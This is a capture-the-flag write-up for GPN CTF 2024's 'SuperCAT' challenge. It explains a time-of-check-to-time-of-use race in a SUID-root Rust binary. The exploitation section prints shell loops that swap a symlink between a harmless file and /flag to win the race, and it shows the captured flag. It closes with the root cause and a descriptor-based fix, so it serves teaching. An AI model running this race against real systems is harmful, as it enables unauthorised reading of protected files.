Walkthrough

GPN CTF 2024 – SuperCAT Writeup

Challenge Information

Category: Miscellaneous Challenge: SuperCAT Points: 82

The challenge provided access to a remote service:

ncat --ssl glazed-mozzarella-sticks-on-cured-tahini-0xkx.gpn24.ctf.kitctf.de 443

After connecting, we received an interactive shell.

Initial Enumeration

Listing the home directory showed a single file:

ls -al

Output:

lrwxrwxrwx 1 ctf ctf 5 Jun 6 13:43 gourmet -> /flag

Attempting to read it with the regular cat command failed:

cat gourmet
cat: gourmet: Permission denied

The flag file itself had restrictive permissions:

ls -l /flag
-r-------- 1 root root 36 Jun 5 22:20 /flag

Since the challenge name was *SuperCAT*, the next step was to search for a custom binary.

find / -iname "*cat*" 2>/dev/null

This revealed:

/usr/local/bin/supercat

Checking its permissions:

ls -l /usr/local/bin/supercat
-rwsr-xr-x 1 root root ...

The binary had the SUID bit set and executed as root.

Understanding the Binary

The challenge files included the source code:

let file_meta = std::fs::metadata(file).expect("could not get file info");

The program checked whether the *real user* had permission to read the file.

If the permission check succeeded, it later executed:

fs::read_to_string(file)

to actually read the file.

The important observation is that the file path is accessed twice:

  1. During metadata()
  2. During read_to_string()

These are two separate filesystem operations.

Vulnerability Analysis

This introduces a classic TOCTOU (Time-of-Check to Time-of-Use) race condition.

The program:

  1. Checks permissions on a file.
  2. Assumes the file remains unchanged.
  3. Opens the file later using the same pathname.

If we can change what the pathname points to between those two operations, the security check becomes meaningless.

A symbolic link is perfect for this.

Exploitation

First, create a readable file:

echo hello > good

Then continuously switch a symlink between the readable file and the protected flag:

while true; do
    ln -sf good race
    ln -sf /flag race
done

In another terminal/session, continuously invoke the vulnerable program:

while true; do
    /usr/local/bin/supercat race
done

Eventually the race is won:

  • metadata() executes while race points to good.
  • The permission check succeeds.
  • Before read_to_string() executes, the symlink changes to /flag.
  • The SUID-root binary opens /flag and prints its contents.

A convenient version is:

while true; do /usr/local/bin/supercat race; done | grep GPN
GPNCTF{ruS7_IS_sHiT_CHaNG3_My_M1ND}

Root Cause

The vulnerable pattern is:

metadata(path);
...
read_to_string(path);

The program validates a pathname and later reopens the pathname instead of operating on the already-validated file descriptor.

A secure approach would be:

  1. Open the file once.
  2. Validate the opened file descriptor.
  3. Read from that same descriptor.

This prevents the file from being swapped between validation and use.

Takeaway

This challenge demonstrates a textbook TOCTOU race condition in a SUID program. The bug occurs because permission verification and file access are performed as separate operations on a mutable pathname, allowing an attacker to replace the target between the check and the use.

Lessons Learned

  • Path validation and file access must use the same opened descriptor.
  • Rust does not automatically prevent logical filesystem races.
  • SUID utilities need careful TOCTOU-safe design.
